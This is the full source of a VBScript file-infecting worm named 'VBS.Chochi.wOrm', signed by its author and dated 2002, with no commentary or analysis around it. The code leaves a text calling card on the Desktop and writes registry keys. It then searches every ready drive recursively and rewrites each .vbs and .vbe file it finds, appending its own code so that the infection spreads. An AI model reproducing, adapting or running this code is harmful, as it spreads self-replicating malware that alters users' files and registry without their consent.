'VBS.Chochi.wOrm
On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
Set Codes = Fso.OpenTextFile(WScript.ScriptFullName,1)
VBScopy = Codes.ReadAll

Set Ws = CreateObject("WScript.Shell")
SayHey = Ws.RegRead("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
Set Teks = Fso.CreateTextFile(SayHey & "\Say Hey....txt")
Teks.WriteLine "VBS.Chochi.wOrm was here"& vbCrlf &"My cHiLd is tHe BesT..."& vbCrlf &"bOrn : 29/08/2002"& vbCrlf &"tHis wOrm made in Indonesia"& vbCrlf &""& vbCrlf &"by Spidey"
Teks.Close()
Ws.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\VBS.Chochi.wOrm\","waS Here !!!"
Ws.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\VBS.Chochi.wOrm\Made in","Indonesia"
Ws.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\VBS.Chochi.wOrm\by","Spidey"

Set Drives = Fso.Drives
For Each Drive in Drives
If Drive.isReady then
	DoSearch Drive & "\"
End If
Next

Sub DoSearch(oChi)
On Error Resume Next
Set FolderObj = Fso.GetFolder(oChi)
Set FO = FolderObj.Files
For each Junior in FO
Set Extension = Fso.GetExtensionName(Junior.Path)
	If  Extension = "vbs" or Extension = "vbe" then
		Set Dady = Fso.OpenTextFile(Junior.Path,1,False)
		If Dady.ReadLine <> "'öCh!" then
			Dady.Close()
			Set Dady = Fso.OpenTextFile(Junior.Path,1,False)
			PaP = Dady.ReadAll()
			Set Dady = Fso.CreateTextFile(Junior.Path,True,False)
			Dady.WriteLine "'öCh!"
			Dady.WriteLine PaP
			Dady.WriteLine VBScopy
			Dady.Close()
		Else
			Dady.Close()
		End If
	End If
Next
For Each Junior2 in FolderObj.SubFolders
DoSearch(Junior2.Path)
Next
End Sub